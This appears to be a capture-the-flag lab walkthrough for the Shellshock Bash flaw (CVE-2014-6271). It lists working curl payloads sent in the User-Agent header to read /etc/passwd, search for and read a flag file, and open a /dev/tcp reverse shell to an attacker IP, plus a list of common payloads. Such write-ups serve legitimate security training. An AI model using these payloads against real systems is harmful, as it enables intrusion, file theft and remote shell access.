# 🐚 CGI Shellshock Attacks (CVE-2014-6271)

> **🎯 Objective:** Exploit Shellshock vulnerability in CGI applications via HTTP headers to achieve remote code execution.

## Overview

**Shellshock (CVE-2014-6271)** affects GNU Bash up to version 4.3, allowing command execution through environment variables in CGI applications. Vulnerability lies in Bash's improper handling of function definitions in environment variables.

---

## HTB Academy Lab Solution

### Lab: Shellshock Exploitation
**Question:** "Enumerate the host, exploit the Shellshock vulnerability, and submit the contents of the flag.txt file located on the server."

#### Step 1: CGI Script Discovery
```bash
# Enumerate CGI scripts
gobuster dir -u http://TARGET/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

# Expected finding: access.cgi
# URL: http://TARGET/cgi-bin/access.cgi
```

#### Step 2: Vulnerability Confirmation
```bash
# Test Shellshock via User-Agent header
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://TARGET/cgi-bin/access.cgi

# If vulnerable: /etc/passwd contents returned
```

#### Step 3: Command Execution
```bash
# File system exploration
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/ls -la /' http://TARGET/cgi-bin/access.cgi

# Find flag.txt location
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/find / -name "flag.txt" 2>/dev/null' http://TARGET/cgi-bin/access.cgi

# Read flag content
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /path/to/flag.txt' http://TARGET/cgi-bin/access.cgi
```

#### Step 4: Reverse Shell (Alternative)
```bash
# Setup listener
nc -lvnp 7777

# Trigger reverse shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1' http://TARGET/cgi-bin/access.cgi
```

**Answer:** `[FLAG_CONTENT]` *(extract from flag.txt)*

---

## Technical Details

### Vulnerability Mechanism
```bash
# Vulnerable Bash function parsing
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"

# Result on vulnerable system: 
# vulnerable-shellshock
# not vulnerable
```

### CGI Attack Vector
- **Environment variables** processed by CGI
- **HTTP headers** become environment variables
- **User-Agent**, **Referer**, **Cookie** headers exploitable
- **Function definition** `() { :; };` followed by malicious commands

### Common Payloads
```bash
# Command execution header
User-Agent: () { :; }; echo ; echo ; /bin/COMMAND

# File reading
User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd

# Reverse shell
User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/IP/PORT 0>&1
```

---

## Attack Summary

**Prerequisites:**
- **CGI application** using Bash
- **Vulnerable Bash version** (< 4.3 unpatched)
- **HTTP access** to CGI scripts

**Impact:**
- **Remote code execution** as web server user
- **File system access** for data exfiltration
- **Reverse shell** for interactive access
- **Potential privilege escalation** vector

**💡 Pro Tip:** Shellshock is common in legacy systems and IoT devices - always test CGI endpoints with environment variable injection when discovered during enumeration. 